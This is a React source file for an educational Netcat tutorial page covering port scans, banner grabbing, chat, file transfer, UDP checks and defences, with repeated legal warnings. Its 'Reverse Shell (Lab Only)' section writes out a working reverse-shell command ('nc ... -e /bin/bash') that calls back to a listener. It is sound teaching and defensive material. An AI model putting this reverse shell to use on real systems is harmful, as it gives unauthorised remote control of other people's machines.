import { Helmet } from 'react-helmet-async'
import ToolLayout from '../components/ToolLayout'

function Section({ id, icon, title, subtitle, children }) {
  return (
    <section id={id} className="glass p-6 sm:p-7 mb-6 scroll-mt-24">
      <div className="flex items-center gap-3 mb-1">
        <span className="text-xl">{icon}</span>
        <h2 className="text-lg sm:text-xl font-extrabold text-white m-0">{title}</h2>
      </div>
      {subtitle && <p className="text-xs text-slate-400 mt-1 mb-4">{subtitle}</p>}
      {!subtitle && <div className="mb-2" />}
      <div className="space-y-4 text-sm text-slate-300 leading-relaxed">{children}</div>
    </section>
  )
}

function CodeBlock({ title, lines }) {
  return (
    <div className="rounded-xl overflow-hidden border border-white/10" style={{ background: '#0a0f1e' }}>
      <div className="flex items-center gap-2 px-4 py-2 border-b border-white/10" style={{ background: '#111827' }}>
        <span className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
        <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/80" />
        <span className="w-2.5 h-2.5 rounded-full bg-green-500/80" />
        {title && <span className="ml-2 text-[11px] font-mono text-slate-400">{title}</span>}
      </div>
      <pre className="p-4 overflow-x-auto text-[13px] leading-relaxed font-mono text-green-300 whitespace-pre-wrap">
{lines}
      </pre>
    </div>
  )
}

function WarningBox({ children }) {
  return (
    <div className="rounded-xl p-4 border border-red-500/30" style={{ background: 'rgba(239,68,68,0.07)' }}>
      <div className="flex items-center gap-2 text-red-300 font-bold text-sm mb-1.5">⚠️ Legal &amp; Ethical Warning</div>
      <div className="text-xs text-red-200/80 leading-relaxed">{children}</div>
    </div>
  )
}

function InfoBox({ title, icon = '💡', children }) {
  return (
    <div className="rounded-xl p-4 border border-cyan-500/25" style={{ background: 'rgba(6,182,212,0.06)' }}>
      <div className="flex items-center gap-2 text-cyan-300 font-bold text-sm mb-1.5">{icon} {title}</div>
      <div className="text-xs text-slate-300 leading-relaxed">{children}</div>
    </div>
  )
}

function FeatureGrid({ items }) {
  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
      {items.map(f => (
        <div key={f.t} className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
          <div className="text-2xl mb-1">{f.i}</div>
          <div className="text-sm font-semibold text-white mb-0.5">{f.t}</div>
          <div className="text-xs text-slate-400">{f.d}</div>
        </div>
      ))}
    </div>
  )
}

function IssueRow({ issue, fix }) {
  return (
    <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
      <div className="flex items-start gap-2">
        <span className="text-red-400 font-bold mt-0.5">✕</span>
        <div className="min-w-0">
          <div className="text-sm font-semibold text-white mb-1">{issue}</div>
          <div className="text-xs text-slate-400 leading-relaxed">
            <span className="text-green-400 font-semibold">Fix: </span>{fix}
          </div>
        </div>
      </div>
    </div>
  )
}

const faq = [
  { q: 'What is Netcat?', a: 'Netcat (nc) is a small command-line tool that reads and writes raw data over TCP or UDP. Think of it as a telephone for computers: one side listens, the other dials in, and anything typed appears on the other screen. Admins use it to test services and move files; attackers abuse it for remote shells.' },
  { q: 'Is Netcat illegal?', a: 'No. Netcat itself is a legitimate open-source networking tool. Using it on computers or networks you do not own or lack written permission to test — especially opening remote shells — is illegal. Only use it on your own lab machines or in an authorized engagement.' },
  { q: 'What do the -l, -v, -n and -p flags do?', a: '-l means listen (wait for a connection), -p picks the port to listen on, -v means verbose (show what is happening), and -n skips DNS lookups so connections resolve faster. A typical listener is nc -lvnp 1234.' },
  { q: 'What does -z do?', a: '-z is scan mode: connect and report, without sending data. Combined with -v, nc -zv target 20-80 tells you which ports in that range accept connections. It is a quick port check, not a full scanner like Nmap.' },
  { q: 'How does the chat work?', a: 'One computer runs nc -lvnp 1234 to listen. A second computer runs nc <first-computer-address> 1234 to connect. From then on, anything either side types appears live on the other screen — a raw two-way pipe with no app needed.' },
  { q: 'Why does -e sometimes not work?', a: 'The -e flag (run a program like /bin/bash on connect) is the famous remote-shell option, but many modern Netcat builds remove it for safety — including netcat-openbsd on Debian/Ubuntu. Defenders also watch for exactly this pattern, so treat it as lab-only knowledge.' },
  { q: 'How do I see if something suspicious is listening?', a: 'Run ss -tulpn on Linux. It lists every listening TCP/UDP port and the program behind it. Anything you do not recognize deserves investigation — close what you do not need and firewall the rest.' },
  { q: 'How do I defend against Netcat abuse?', a: 'Close unused ports, check listeners with ss -tulpn, allow only known ports through a firewall like ufw, log outbound connections, and run an intrusion detection system like Snort or Suricata that flags reverse-shell patterns.' },
]

const howItWorks = [
  'Install Netcat and verify it with nc -h.',
  'Scan ports and grab banners with nc -zv and a manual connection.',
  'Build a two-way chat with a listener and a connector.',
  'Move files across the pipe — lab machines only.',
  'Check your own listeners and firewall with ss and ufw.',
]

const schema = {
  '@context': 'https://schema.org',
  '@graph': [
    {
      '@type': 'TechArticle',
      headline: 'Netcat — Swiss Army Knife Guide (Educational)',
      description: 'Step-by-step reference for using Netcat: port checks, banners, chat, file transfer, reverse shells (lab only), UDP checks, and defense.',
      about: 'Netcat networking tool',
      educationalUse: 'Testing, education, and authorized use only',
    },
    {
      '@type': 'FAQPage',
      mainEntity: faq.map(f => ({
        '@type': 'Question',
        name: f.q,
        acceptedAnswer: { '@type': 'Answer', text: f.a },
      })),
    },
  ],
}

export default function hncker_netcat() {
  return (
    <ToolLayout
      title="Netcat — Swiss Army Knife Guide"
      desc="Step-by-step reference: install & use Netcat for port checks, banners, chat, file transfer, shells (lab only). Educational purposes only."
      icon="🔧"
      iconBg="linear-gradient(135deg, rgba(0,255,65,0.18), rgba(6,182,212,0.08))"
      category="security"
      slug="hncker/netcat"
      faq={faq}
      howItWorks={howItWorks}
      schema={schema}
    >
      <Helmet>
        <meta name="robots" content="index, follow" />
        <meta property="og:image" content="https://www.uptools.in/assets/tools/netcat/netcat_scan.png" />
      </Helmet>

      <Section id="video" icon="🎬" title="Video Tutorial" subtitle="Watch the HNCKER walkthrough">
        <div className="max-w-3xl mx-auto">
          <div className="relative w-full" style={{ paddingBottom: '56.25%' }}>
            <iframe
              className="absolute inset-0 w-full h-full rounded-xl border border-white/10"
              src="https://www.youtube.com/embed/qeMPvVaS7vQ"
              title="Netcat Tutorial — Swiss Army Knife | HNCKER"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
              allowFullScreen
            />
          </div>
        </div>
      </Section>

      <WarningBox>
        Netcat is a legitimate networking tool. Use it <b>only on machines and networks you own or have written
        permission to test</b>. Opening shells or moving data on systems that are not yours is illegal. This page is
        for <b>educational and authorized use only</b>.
      </WarningBox>

      <Section id="overview" icon="🔧" title="What is Netcat?" subtitle="A telephone for computers">
        <p>
          <b>Netcat</b> (the <span className="font-mono">nc</span> command) reads and writes raw network data over{' '}
          <b>TCP or UDP</b>. One side listens, the other dials in, and whatever either side types appears on the other
          screen — a raw two-way pipe with no app in the middle.
        </p>
        <p>
          Admins use it to test services, grab banners and move files fast. Attackers love the same pipe for remote
          shells. Same tool, different intent — which is why defenders watch for it.
        </p>
        <FeatureGrid items={[
          { i: '📞', t: 'Raw TCP/UDP pipe', d: 'Whatever you type appears on the other side.' },
          { i: '🎯', t: 'Port checks', d: '-z scans, -v reports what is open.' },
          { i: '💬', t: 'Chat + transfer', d: 'Two-way chat and file moves, no server.' },
          { i: '🐚', t: 'Shells (lab only)', d: '-e attaches a shell — know it to detect it.' },
        ]} />
      </Section>

      <Section id="requirements" icon="⚙️" title="Requirements" subtitle="What you need before running">
        <ul className="list-none p-0 m-0 space-y-2">
          {[
            ['☑️', 'Kali Linux (pre-installed) or Ubuntu/Debian'],
            ['☑️', 'Two lab machines or VMs for chat/file demos'],
            ['☑️', 'A terminal — no GUI needed'],
            ['☑️', 'Written permission if anything is not yours'],
          ].map(([c, t]) => (
            <li key={t} className="flex items-start gap-2 text-slate-300">
              <span>{c}</span><span>{t}</span>
            </li>
          ))}
        </ul>
      </Section>

      <Section id="installation" icon="🛠️" title="Installation" subtitle="One command to install">
        <CodeBlock title="terminal" lines={`nc -h
# Netcat - swiss army knife ready`} />
        <CodeBlock title="debian / ubuntu" lines={`sudo apt update
sudo apt install netcat-openbsd`} />
        <InfoBox title="Kali has it already">
          On Kali Linux Netcat comes pre-installed — <span className="font-mono">nc -h</span> is enough to confirm.
          On Debian/Ubuntu install the <span className="font-mono">netcat-openbsd</span> package.
        </InfoBox>
      </Section>

      <Section id="scan" icon="🎯" title="Step 1 — Scan Ports & Grab Banners" subtitle="-z scans, banners leak versions">
        <p className="text-xs text-slate-400">Check which ports accept connections, then read the service banner:</p>
        <CodeBlock title="terminal" lines={`nc -zv scanme.nmap.org 20-80
# port 22 [tcp/ssh] succeeded!
# port 80 [tcp/http] succeeded!`} />
        <CodeBlock title="terminal" lines={`nc scanme.nmap.org 80
GET / HTTP/1.0

# HTTP/1.1 200 OK ... Server: Apache/2.4.49`} />
        <InfoBox title="Why banners matter">
          The banner reveals the software and version — exactly what an attacker feeds into an exploit search. That is
          why you check your own banners and hide or patch what leaks too much.
        </InfoBox>
      </Section>

      <Section id="chat" icon="💬" title="Step 2 — Two-Way Chat" subtitle="Listener plus connector">
        <p className="text-xs text-slate-400">Start a listener on the first machine, connect from the second:</p>
        <CodeBlock title="machine A — listen" lines={`nc -lvnp 1234
# Listening on 0.0.0.0:1234... connected!`} />
        <CodeBlock title="machine B — join" lines={`nc 192.168.1.5 1234
hello from the other side!`} />
        <InfoBox title="Flags in plain words">
          <span className="font-mono">-l</span> listen, <span className="font-mono">-p</span> pick the port,{' '}
          <span className="font-mono">-v</span> verbose, <span className="font-mono">-n</span> skip DNS lookups.
          Type anything on either side — it appears live on the other.
        </InfoBox>
      </Section>

      <Section id="transfer" icon="📄" title="Step 3 — Move Files" subtitle="Raw bytes across the pipe">
        <p className="text-xs text-slate-400">Receive on one side, send on the other. Lab machines only:</p>
        <CodeBlock title="receiver" lines={`nc -lvnp 9000 > got.zip`} />
        <CodeBlock title="sender" lines={`nc 192.168.1.5 9000 < file.zip
# bytes flowing... copied!`} />
        <InfoBox title="No server needed">
          There is no login, no web server, no setup — just the pipe. That convenience is exactly why you never run
          open listeners on machines that face the internet.
        </InfoBox>
      </Section>

      <Section id="shell" icon="🐚" title="Step 4 — Reverse Shell (Lab Only)" subtitle="Know it so you can detect it">
        <p className="text-xs text-slate-400">The famous pattern — the target calls back with its shell attached:</p>
        <CodeBlock title="attacker waits" lines={`nc -lvnp 4444`} />
        <CodeBlock title="target connects back — LAB ONLY" lines={`nc 10.0.0.5 4444 -e /bin/bash
# shell received`} />
        <InfoBox title="Modern builds drop -e">
          Many current Netcat builds remove <span className="font-mono">-e</span> for safety. Defenders watch for the
          pattern anyway: a machine making an unexpected outbound shell connection. Never run this outside your own lab.
        </InfoBox>
      </Section>

      <Section id="udp" icon="📡" title="Step 5 — UDP & Service Checks" subtitle="Speak UDP, identify services">
        <p className="text-xs text-slate-400">Probe UDP services and read banners to identify what is running:</p>
        <CodeBlock title="terminal" lines={`nc -uv target.com 53
nc -v -w 2 target.com 25
# 220 mail.target.com ESMTP ready`} />
        <InfoBox title="Fail fast">
          <span className="font-mono">-u</span> switches to UDP, <span className="font-mono">-v</span> is verbose, and{' '}
          <span className="font-mono">-w 2</span> adds a two-second timeout so dead ports fail fast instead of hanging.
        </InfoBox>
      </Section>

      <Section id="defense" icon="🛡️" title="Defense — Stop Netcat Abuse" subtitle="See it before attackers use it">
        <CodeBlock title="terminal" lines={`ss -tulpn
# every listening port + program behind it`} />
        <FeatureGrid items={[
          { i: '👂', t: 'Check listeners', d: 'ss -tulpn shows everything listening.' },
          { i: '🧱', t: 'Firewall', d: 'ufw: allow only known ports.' },
          { i: '👁️', t: 'Detect shells', d: 'Snort / Suricata flag reverse shells.' },
          { i: '🔍', t: 'Scan yourself', d: 'If nc reaches it, attackers can too.' },
        ]} />
      </Section>

      <Section id="screenshots" icon="🖼️" title="Screenshot" subtitle="Netcat in action">
        <figure className="rounded-xl overflow-hidden border border-white/10" style={{ background: 'rgba(0,0,0,0.3)' }}>
          <img src="/assets/tools/netcat/netcat_scan.png" alt="Netcat terminal session" width="960" height="540"
            className="w-full h-auto object-contain" loading="lazy" />
          <figcaption className="px-4 py-2 text-xs text-slate-400">A Netcat session: raw bytes across the pipe</figcaption>
        </figure>
      </Section>

      <Section id="flags" icon="🏷️" title="Flags &amp; Options" subtitle="Every option explained">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">-l</div>
            <div className="text-xs text-slate-400">Listen mode: wait for a connection instead of dialing out.</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">-p</div>
            <div className="text-xs text-slate-400">Pick the local port to listen on, e.g. -p 1234.</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">-v</div>
            <div className="text-xs text-slate-400">Verbose: print what is happening (use twice for more).</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">-n</div>
            <div className="text-xs text-slate-400">Skip DNS lookups — faster connects, numeric-only.</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">-z</div>
            <div className="text-xs text-slate-400">Scan mode: report open ports without sending data.</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">-u</div>
            <div className="text-xs text-slate-400">Use UDP instead of TCP (DNS, streaming, games).</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">-w</div>
            <div className="text-xs text-slate-400">Timeout in seconds, e.g. -w 2 fails dead ports fast.</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">-e</div>
            <div className="text-xs text-slate-400">Run a program on connect (remote shells). Often removed; lab only.</div>
          </div>
        </div>
      </Section>

      <Section id="issues" icon="🐞" title="Common Issues & Fixes" subtitle="Real problems people hit">
        <div className="space-y-3">
          <IssueRow
            issue="Connection refused"
            fix="Nothing is listening on that port, or a firewall blocks it. Check the listener is running and the port matches on both sides."
          />
          <IssueRow
            issue="Hangs with no output"
            fix="Add -v to see what is happening and -w 2 so dead targets time out instead of hanging forever."
          />
          <IssueRow
            issue="nc: invalid option -- e"
            fix="Your build removed -e for safety (normal on Debian/Ubuntu). That is expected — learn the pattern for detection instead."
          />
          <IssueRow
            issue="File transfer produces an empty file"
            fix="The sender connected before the receiver was listening, or the redirect is on the wrong side. Start the receiver (with > file) first, then send (with < file)."
          />
        </div>
      </Section>

      <Section id="resources" icon="🔗" title="Resources" subtitle="Official links">
        <div className="space-y-2">
          {[
            ['📦', 'OpenBSD netcat', 'https://man.openbsd.org/nc'],
            ['📖', 'Kali Linux tools', 'https://www.kali.org/tools/'],
            ['🎬', 'HNCKER tutorials', 'https://www.youtube.com/@hncker'],
          ].map(([i, label, href]) => (
            <a key={href} href={href} target="_blank" rel="noopener noreferrer"
              className="flex items-center gap-2 rounded-lg px-3 py-2 border border-white/8 hover:border-brand/40 hover:bg-white/5 transition-all text-slate-300 hover:text-white no-underline">
              <span>{i}</span>
              <span className="text-sm font-medium">{label}</span>
              <span className="ml-auto text-indigo-300 text-xs font-mono break-all">{href}</span>
            </a>
          ))}
        </div>
      </Section>

      <Section id="disclaimer" icon="📜" title="Disclaimer" subtitle="Read before you run anything">
        <p>
          This documentation is provided <b>strictly for educational and authorized purposes</b>. Netcat is a
          legitimate networking tool, but using it on systems you do not own or lack written permission
          to test is illegal. Use it only on your own lab machines or within an authorized security engagement. The author
          and this site are not responsible for any misuse.
        </p>
      </Section>
    </ToolLayout>
  )
}
